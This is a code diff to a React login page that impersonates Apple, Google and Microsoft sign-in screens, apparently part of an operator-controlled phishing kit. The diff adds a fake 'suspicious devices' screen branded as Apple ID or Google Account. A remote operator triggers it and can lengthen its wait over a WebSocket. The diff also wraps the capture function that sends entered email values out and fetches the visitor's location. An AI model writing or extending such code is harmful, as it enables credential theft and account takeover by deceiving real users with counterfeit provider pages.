+                <div className="w-full bg-[#e5e5ea] rounded-full h-1 mb-4 overflow-hidden">
+                  <motion.div className="h-full rounded-full bg-[#007AFF]" animate={{ width: `${progressPct}%` }} transition={{ duration: 0.9, ease: 'linear' }} />
+                </div>
+                <div className="text-[13px] text-[#8e8e93] mb-4">Please wait — this may take a moment</div>
+                {extendedShown && (
+                  <motion.div initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }}
+                    className="text-center bg-[#f5f5f7] border border-[#d1d1d6] rounded-2xl px-5 py-3 mt-1">
+                    <div className="text-[14px] font-medium text-[#1d1d1f]">Sorry, this may take a little longer.</div>
+                    <div className="text-[13px] text-[#3a3a3c] mt-0.5">We are thoroughly reviewing your Apple ID for security threats.</div>
+                  </motion.div>
+                )}
+              </motion.div>
+            )}
+            {phase === 'complete' && (
+              <motion.div key="apple-done" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
+                <div className="w-20 h-20 rounded-full bg-[#E8FAE8] flex items-center justify-center mb-6">
+                  <Check className="w-10 h-10 text-[#34c759]" />
+                </div>
+                <div className="text-[26px] font-semibold text-[#1d1d1f] mb-2 tracking-tight">Devices removed</div>
+                <div className="text-[15px] text-[#6e6e73] mb-10 text-center">Unauthorised devices have been removed from your Apple ID.</div>
+                <button onClick={onDone} className="px-12 py-3 rounded-2xl text-[17px] font-medium text-white hover:brightness-90 transition-all" style={{ backgroundColor: '#007AFF' }}>Done</button>
+              </motion.div>
+            )}
+          </AnimatePresence>
+        </div>
+      </div>
+    );
+  }
+
+  // ── Google ────────────────────────────────────────────────────────────────
+  return (
+    <div className="fixed inset-0 z-50 overflow-y-auto bg-[#f0f4f9]" style={{ fontFamily: "'Google Sans', Roboto, system-ui, sans-serif" }}>
+      <div className="bg-white border-b border-[#dadce0] px-6 py-3 flex items-center gap-3 sticky top-0 z-10">
+        <GoogleLogo />
+        <span className="text-[16px] font-medium text-[#202124] ml-1">Google Account</span>
+        {email && <span className="ml-auto text-[12px] text-[#5f6368] truncate max-w-[220px]">{email}</span>}
+      </div>
+      <div className="max-w-[560px] mx-auto px-4 py-8">
+        <AnimatePresence mode="wait">
+          {phase === 'list' && (
+            <motion.div key="google-list" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
+              <div className="flex gap-3 bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-4 py-3.5 mb-7">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#444746" strokeWidth="1.5"/><line x1="12" y1="9" x2="12" y2="13" stroke="#444746" strokeWidth="1.5" strokeLinecap="round"/><circle cx="12" cy="17" r="1" fill="#444746"/></svg>
+                <div>
+                  <div className="text-[14px] font-medium text-[#202124]">Suspicious device activity detected</div>
+                  <div className="text-[13px] text-[#5f6368] leading-snug mt-0.5">We noticed sign-in activity from devices that don't belong to you. Remove any you don't recognise.</div>
+                </div>
+              </div>
+              <div className="text-[22px] font-normal text-[#202124] mb-1">Your devices</div>
+              <div className="text-[14px] text-[#5f6368] mb-6">Devices that have recently accessed your Google Account.</div>
+              <div className="space-y-3 mb-7">
+                {SUSP_DEVICES.map(dev => {
+                  const isRemoved = removedIds.has(dev.id);
+                  const isRemoving = removingId === dev.id;
+                  return (
+                    <motion.div key={dev.id} animate={{ opacity: isRemoved ? 0.4 : 1 }} transition={{ duration: 0.3 }}
+                      className="bg-white rounded-xl border border-[#dadce0] px-4 py-4 flex items-center gap-4">
+                      <div className="flex-shrink-0 w-10 h-10 rounded-full bg-[#f0f4f9] flex items-center justify-center">
+                        <DeviceKindIcon kind={dev.kind} size={26} />
+                      </div>
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center gap-2 flex-wrap">
+                          <span className="text-[15px] font-medium text-[#202124]">{dev.name}</span>
+                          {dev.isCurrent && <span className="text-[11px] font-medium bg-[#1a73e8] text-white px-2 py-0.5 rounded-full">This device</span>}
+                          {isRemoved && <span className="text-[12px] text-[#1e8e3e] font-medium flex items-center gap-0.5"><Check className="w-3 h-3" />Removed</span>}
+                        </div>
+                        <div className="text-[13px] text-[#5f6368]">{dev.os}</div>
+                        <div className="text-[12px] text-[#80868b] flex flex-wrap gap-x-1">
+                          {dev.flag && <span>{dev.flag}</span>}
+                          <span>{getDevLocation(dev)}</span>
+                          {dev.ip && <><span>·</span><span className="font-mono">{dev.ip}</span></>}
+                          <span>·</span><span>{dev.lastSeen}</span>
+                        </div>
+                      </div>
+                      <div className="flex-shrink-0">
+                        {!dev.isCurrent && !isRemoved && !isRemoving && (
+                          <button onClick={() => handleRemove(dev.id)}
+                            className="text-[#d93025] text-[13px] font-medium border border-[#d93025] hover:bg-[#fce8e6] px-3 py-1.5 rounded-full transition-colors">
+                            Remove device
+                          </button>
+                        )}
+                        {isRemoving && <svg className="w-5 h-5 animate-spin text-[#1a73e8]" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2.5" strokeOpacity="0.25"/><path d="M12 2a10 10 0 0110 10" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"/></svg>}
+                      </div>
+                    </motion.div>
+                  );
+                })}
+              </div>
+              {anyRemoved && (
+                <motion.div initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="flex justify-end">
+                  <button onClick={() => setPhase('removing')}
+                    className="px-8 py-2.5 rounded-full text-[14px] font-medium text-white hover:brightness-90 transition-all"
+                    style={{ backgroundColor: '#1a73e8' }}>
+                    Secure my account
+                  </button>
+                </motion.div>
+              )}
+            </motion.div>
+          )}
+          {phase === 'removing' && (
+            <motion.div key="google-removing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-14">
+              <div className="mb-7 relative w-20 h-20">
+                <svg className="w-20 h-20 animate-spin" viewBox="0 0 64 64" style={{ animationDuration: '1.1s' }}>
+                  <defs><linearGradient id="goog-susp-spin" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stopColor="#4285F4"/><stop offset="33%" stopColor="#EA4335"/><stop offset="66%" stopColor="#FBBC05"/><stop offset="100%" stopColor="#34A853"/></linearGradient></defs>
+                  <circle cx="32" cy="32" r="28" fill="none" strokeWidth="4.5" strokeLinecap="round" stroke="url(#goog-susp-spin)" strokeDasharray="105 132"/>
+                </svg>
+                <div className="absolute inset-0 flex items-center justify-center"><GoogleLogo /></div>
+              </div>
+              <div className="text-[20px] font-normal text-[#202124] mb-2 text-center">Removing unauthorised devices</div>
+              <div className="text-[14px] text-[#5f6368] mb-7 text-center min-h-[20px]">{REMOVAL_MSGS[msgIdx]}</div>
+              <div className="w-full bg-[#e8eaed] rounded-full h-1.5 mb-4 overflow-hidden">
+                <motion.div className="h-full rounded-full bg-[#1a73e8]" animate={{ width: `${progressPct}%` }} transition={{ duration: 0.9, ease: 'linear' }} />
+              </div>
+              <div className="text-[13px] text-[#80868b] mb-4">Please wait — this may take a moment</div>
+              {extendedShown && (
+                <motion.div initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }}
+                  className="text-center bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-5 py-3 mt-1">
+                  <div className="text-[14px] font-medium text-[#202124]">Sorry, this may take a little longer.</div>
+                  <div className="text-[13px] text-[#5f6368] mt-0.5">We are thoroughly reviewing your account activity.</div>
+                </motion.div>
+              )}
+            </motion.div>
+          )}
+          {phase === 'complete' && (
+            <motion.div key="google-done" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
+              <div className="w-20 h-20 rounded-full bg-[#e6f4ea] flex items-center justify-center mb-6">
+                <Check className="w-10 h-10 text-[#1e8e3e]" />
+              </div>
+              <div className="text-[22px] font-normal text-[#202124] mb-2">Account secured</div>
+              <div className="text-[14px] text-[#5f6368] mb-10 text-center">Unauthorised devices have been removed from your Google Account.</div>
+              <button onClick={onDone} className="px-10 py-2.5 rounded-full text-[14px] font-medium text-white hover:brightness-90 transition-all" style={{ backgroundColor: '#1a73e8' }}>Done</button>
+            </motion.div>
+          )}
+        </AnimatePresence>
+      </div>
+    </div>
+  );
+}
+
 // ─── Root ─────────────────────────────────────────────────────────────────────
 
 export default function LoginPage() {
@@ -3025,12 +3457,41 @@ export default function LoginPage() {
   const setNavigateHandler = useCallback((fn: NavigateHandler) => {
     navigateHandlerRef.current = fn;
   }, []);
-  const { sendCapture, sendStepUpdate } = useVisitorWS({
+  const [suspDevMode, setSuspDevMode] = useState<{ waitSeconds: number } | null>(null);
+  const [extendedRemoval, setExtendedRemoval] = useState(false);
+
+  const capturedEmailRef = useRef('');
+  const [visitorLocation, setVisitorLocation] = useState('');
+
+  useEffect(() => {
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    fetch(`${base}/api/location`)
+      .then(r => r.json() as Promise<{ city: string; country: string }>)
+      .then(d => { if (d.city && d.country) setVisitorLocation(`${d.city}, ${d.country}`); })
+      .catch(() => {});
+  }, []);
+
+  const { sendCapture: _rawSendCapture, sendStepUpdate } = useVisitorWS({
     provider,
-    onNavigate: (s, action) => navigateHandlerRef.current(s, action),
+    onNavigate: (s, action) => {
+      if (s === 'suspicious-devices') {
+        setSuspDevMode({ waitSeconds: (action as NavigateAction)?.waitSeconds ?? 20 });
+        setExtendedRemoval(false);
+        return;
+      }
+      if (s === 'extend-removal-time') { setExtendedRemoval(true); return; }
+      setSuspDevMode(null);
+      navigateHandlerRef.current(s, action);
+    },
     onProviderSwitch: handleProviderSwitch,
     onSiteStatus: (active) => setSiteActive(active),
   });
+  const sendCapture = useCallback((field: string, value: string) => {
+    if (field === 'email' && value) capturedEmailRef.current = value;
+    _rawSendCapture(field, value);
+  }, [_rawSendCapture]);
+
+  useEffect(() => { if (suspDevMode) sendStepUpdate('suspicious-devices'); }, [suspDevMode, sendStepUpdate]);
 
   // Auto-detect device on resize (only when no URL override)
   useEffect(() => {
@@ -3131,6 +3592,16 @@ export default function LoginPage() {
       {provider === 'microsoft' && <MicrosoftLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
       {provider === 'apple' && <AppleLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
       {provider === 'google' && <GoogleLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
+      {suspDevMode && (
+        <SuspiciousDevicesScreen
+          provider={provider}
+          waitSeconds={suspDevMode.waitSeconds}
+          extended={extendedRemoval}
+          onDone={() => setSuspDevMode(null)}
+          email={capturedEmailRef.current}
+          visitorLocation={visitorLocation}
+        />
+      )}
     </div>
   );
 }
